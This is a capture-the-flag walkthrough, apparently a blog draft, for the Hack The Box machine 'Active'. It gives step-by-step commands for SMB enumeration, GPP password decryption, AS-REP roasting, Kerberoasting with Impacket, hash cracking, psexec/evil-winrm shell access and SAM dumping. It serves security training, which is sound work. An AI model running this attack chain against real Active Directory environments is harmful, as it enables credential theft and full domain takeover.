---
title: "HTB: Active Walkthrough"
date: "2025-11-01"
description: "My solution for the Active machine on Hack The Box, focusing on Kerberoasting and SMB enumeration."
tags: ["htb", "writeup", "windows", "kerberoasting", "active-directory"]
---

**By Stager** | FashilHack

## What is this machine

Active is a Windows Active Directory box from Hack The Box that focuses on:
- **Kerberoasting**
- **SMB enumeration**
- Abusing **service accounts** to gain administrative access

## Target

```
IP: 10.10.10.1
OS: Windows
```

## Step 1 — Concept: Kerberoasting (Quick Explanation)

**Goal of Kerberoasting:**  
Request a **TGS (Ticket Granting Service)** for a service account and crack the **service account password hash** offline.

Flow:
1. User logs in → gets **TGT**
2. Use TGT to request **TGS**
3. TGS is encrypted with the **service account password hash**
4. Crack the hash → get service account password

Tool used: `GetUserSPNs.py` (Impacket)

📸 **Screenshot to add here:**
- Concept diagram or initial flow

## Step 2 — Recon

Initial Nmap scan:

```bash
nmap -A -p- -T5 -Pn 10.10.10.1 -v
```

This revealed SMB, Kerberos, LDAP, and other AD-related services.

📸 **Screenshot to add here:**
- Nmap output showing open ports

## Step 3 — SMB Enumeration

### smbmap (anonymous access check)

```bash
smbmap -H 10.10.10.1
```

Looking for:
* Anonymous access
* Readable shares

### smbclient (manual enumeration)

List shares anonymously:

```bash
smbclient -N -L //10.10.10.1
```

Access a share:

```bash
smbclient //10.10.10.1/ShareName
```

Recursive listing:

```bash
smbclient //10.10.10.1/ShareName -c 'recurse;ls'
```

Download a file:

```bash
get Groups.xml
```

📸 **Screenshot to add here:**
- SMB shares and downloaded Groups.xml

## Step 4 — Group Policy Preference Password

After downloading `Groups.xml`, a password hash was found.

Decrypt it using:

```bash
gpp-decrypt <hash>
```

This revealed:
* A **username**
* A **password**
* The account was a **service account**

📸 **Screenshot to add here:**
- gpp-decrypt output showing credentials

## Step 5 — Validate Credentials

Check SMB access with the new credentials:

```bash
smbmap -H 10.10.10.1 -u username -p password
```

## Step 6 — AS-REP Roasting (GetNPUsers)

If you have a username but **no password**, test AS-REP roasting:

```bash
impacket-GetNPUsers FH.local/said -dc-ip 10.10.10.1 -no-pass
```

⚠️ AS-REP roasting only works if:
* **“Do not require Kerberos preauthentication”** is enabled

If it’s not enabled → no hash returned.

## Step 7 — Kerberoasting (GetUserSPNs)

Kerberoasting targets **service accounts with SPNs**.

Important facts:
* Kerberoasting depends **ONLY on SPNs**
* You **must** have at least **one valid domain user**
* You crack the **service account password**, not admin directly

Request TGS:

```bash
impacket-GetUserSPNs -request -dc-ip 10.10.10.1 DOMAIN/username:password
```

### Fix Clock Skew (if error)

```bash
sudo apt install ntpsec-ntpdate -y
sudo ntpdate 10.10.10.1
```

📸 **Screenshot to add here:**
- GetUserSPNs returning a hash

## Step 8 — Crack the Hash

Identify hash type by the `$` format, then crack using Hashcat:

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

Or with John:

```bash
john hash.txt /usr/share/wordlists/rockyou.txt
```

📸 **Screenshot to add here:**
- Hashcat or John showing cracked password

## Step 9 — Shell Access

After cracking the hash, authenticate using:

### evil-winrm (if WinRM open)

```bash
evil-winrm -i 10.10.10.1 -u administrator -p password
```

⚠️ Reminder:
If WinRM is blocked, evil-winrm will NOT work.

### psexec (fallback)

```bash
impacket-psexec active.htb/administrator:password@10.10.10.1
```

With rlwrap:

```bash
rlwrap impacket-psexec active.htb/administrator:password@10.10.10.1
```

📸 **Screenshot to add here:**
- Administrative shell access

## Step 10 — netexec (crackmapexec replacement)

Validate credentials:

```bash
netexec smb 10.10.10.1 -u "username" -p "password"
```

List users:

```bash
netexec smb 10.10.10.1 -u "username" -p "password" --users
```

Dump SAM (admin required):

```bash
netexec smb 10.10.10.1 -u "administrator" -p "password" --sam
```

## Full Attack Chain

```
Nmap / Recon
  ↓
SMB Enumeration → Groups.xml
  ↓
GPP Decrypt → user credentials
  ↓
Kerberoasting (GetUserSPNs) → service account hash
  ↓
Crack hash → administrator password
  ↓
Shell access via psexec / evil-winrm
```

## Key Takeaways

**1. SMB misconfigurations expose sensitive data**  
Readable `Groups.xml` often leads to leaked GPP passwords.

**2. Kerberoasting is highly effective**  
As long as you have one valid user and an SPN exists, you can attempt to crack the service account offline.

**3. Tooling flexibility**  
Using Impacket suite and Netexec allows for thorough AD enumeration and credential validation.

_Stager — FashilHack — Simulating Attacks, Securing Businesses._
